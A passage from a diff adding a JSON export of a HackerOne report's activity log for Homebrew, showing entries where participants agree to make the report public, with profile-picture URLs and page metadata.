h3Ycyu6ykGuvGpAe2NRP8jjunjuupvvkfgU0wIMQ%2FGW9sk7LZC0l%2FcxtxdFUB7tyNgRXsKFMao8Zd8oefA4g8pB2uRU%2B69%2Fq46h3aTIUpetFDYBd3TkVrK492zxQ3uogGwX7osKLzU5nxch7eG%2B507P8wTK7KWrQKIM6tTKvc3M%2BTLPvEUU7cYQJ3qyhU5lqDhH9I5qW5OaZo54eJJIFvbEoqk3C4LHxDmDrhJLhktAdD1A8bt4uGwkAxrPv6E7e1%2FSfPwOca05sA9Z6wendh89z1R5rtTDMaxV9%2FUxY0wmjd3NeqjN1XwZnJbQhCGGvfJ6E%2BqwvMd0APQc3Z%2FlWR2dqTc5FrkmCQui4IA4w9Zi2pwY6sQE7wRj1Oxg0O8u8POt7PWf8qRtqLFUvU0cLSS8IMZ5a9SYmyVvhbg5r3BwIvqmz2BgNOR%2B11zEEaur7aC64OW1EKG2unPxmYrlpvv%2FCy9GR3IVoMLibd5H3WUvuYXqG%2FPEKyB3eksXE0Eaz6H5kncua8L1Zrqa7oAlcN7T1dY%2F22nfPExln5a%2FCdZHrRkAzxGsqqgRGKV1qY4%2F6jqdnZRQPEFgdD2zWD1G5xqCRcryq1Og%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=907040985d9e80e0a178a646a062b9c6448aebcd376a8fafdb87a6eb8a3d9f0c"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "homebrew"
+        },
+        {
+            "id": 4918506,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-05-24T16:14:38.676Z",
+            "updated_at": "2019-05-24T16:14:38.676Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "mikemcquaid",
+                "cleared": false,
+                "verified": false,
+                "url": "/mikemcquaid",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/rwqfvd8y58p42weq9cq5q3j52jij/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22Me.jpg%22%3B%20filename%2A%3DUTF-8%27%27Me.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LG6RZDL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073307Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEJdTZfeKApP2QS7QGiB0WEdU4pYq%2FsRbpdwPy2QyNAeAiEAmgtLgdwqFXMBVHr7gfKhZwYKoScAzlOtnFSHF25tz%2FUquwUIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDOF9JtZ4gkfpfs%2BDSyqPBeDmRTGOk%2FQ0Lp4UDtYHCYRdXC3RScdKv49e48LePEUQFXzscb2IHgIHyRGNZoAUqXYVhAUbTajcOPmHcZ93%2FOeX9JmoWmtzA24A2Hq74bOzGyNbUiV5V0PnMAyxfHC%2Br%2FN5nLc%2BrKOa1iur3rZuolDaW2qQae4zTcR3h47ugYPBwueCw0%2BOwpJwXIS%2BGBe8Y5F5E6J3E95sXR1FwTk%2F3o3uIwry60pn4YOrV4QMv%2BU%2FEQkgTGeFl%2FGOmAPKV9FEDXIzD5ctWPRMSDRGMHlMsvFRQkHdbAHzCBDsMt63iPa2gEzAIXjQo9Okb53zq3hhq8rDrKIOjCHNM84Kj2lz%2BPW4zyhbGJUlkG7Hys5go92k7P469aY%2F%2FRwJenDUbrAe1qz2OWKVLrrWxNfaBDjogaQO3sj4usfn1yOuDpmEoPnvjSdgsF3C69t7QLqopNArierFJkQ6C4e0P8l0e5xVmJhsKXvDGoEe1n3mMkTFubO6yCQaRW%2BIT6ld%2Btnv02IgwbxWh3Ycyu6ykGuvGpAe2NRP8jjunjuupvvkfgU0wIMQ%2FGW9sk7LZC0l%2FcxtxdFUB7tyNgRXsKFMao8Zd8oefA4g8pB2uRU%2B69%2Fq46h3aTIUpetFDYBd3TkVrK492zxQ3uogGwX7osKLzU5nxch7eG%2B507P8wTK7KWrQKIM6tTKvc3M%2BTLPvEUU7cYQJ3qyhU5lqDhH9I5qW5OaZo54eJJIFvbEoqk3C4LHxDmDrhJLhktAdD1A8bt4uGwkAxrPv6E7e1%2FSfPwOca05sA9Z6wendh89z1R5rtTDMaxV9%2FUxY0wmjd3NeqjN1XwZnJbQhCGGvfJ6E%2BqwvMd0APQc3Z%2FlWR2dqTc5FrkmCQui4IA4w9Zi2pwY6sQE7wRj1Oxg0O8u8POt7PWf8qRtqLFUvU0cLSS8IMZ5a9SYmyVvhbg5r3BwIvqmz2BgNOR%2B11zEEaur7aC64OW1EKG2unPxmYrlpvv%2FCy9GR3IVoMLibd5H3WUvuYXqG%2FPEKyB3eksXE0Eaz6H5kncua8L1Zrqa7oAlcN7T1dY%2F22nfPExln5a%2FCdZHrRkAzxGsqqgRGKV1qY4%2F6jqdnZRQPEFgdD2zWD1G5xqCRcryq1Og%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=907040985d9e80e0a178a646a062b9c6448aebcd376a8fafdb87a6eb8a3d9f0c"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "homebrew"
+        },
+        {
+            "id": 4918611,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-05-24T16:36:52.556Z",
+            "updated_at": "2019-05-24T16:36:52.556Z",
+            "actor": {
+                "username": "keeleysam",
+                "cleared": false,
+                "verified": false,
+                "url": "/keeleysam",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "homebrew"
+        },
+        {
+            "id": 4918612,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-05-24T16:36:52.616Z",
+            "updated_at": "2019-05-24T16:36:52.616Z",
+            "actor": {
+                "username": "keeleysam",
+                "cleared": false,
+                "verified": false,
+                "url": "/keeleysam",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "homebrew"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
